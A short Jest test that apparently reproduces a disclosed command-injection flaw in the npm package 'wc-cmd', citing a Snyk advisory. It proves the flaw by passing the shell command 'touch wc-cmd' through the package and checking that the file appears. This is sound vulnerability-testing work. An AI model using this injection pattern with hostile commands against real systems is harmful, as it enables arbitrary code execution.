//https://snyk.io/vuln/SNYK-JS-WCCMD-1050423
test("Command Injection in wc-cmd", () => {
  const a = require("wc-cmd");
  const fs = require("fs");
  const path = "./wc-cmd";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("touch wc-cmd");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
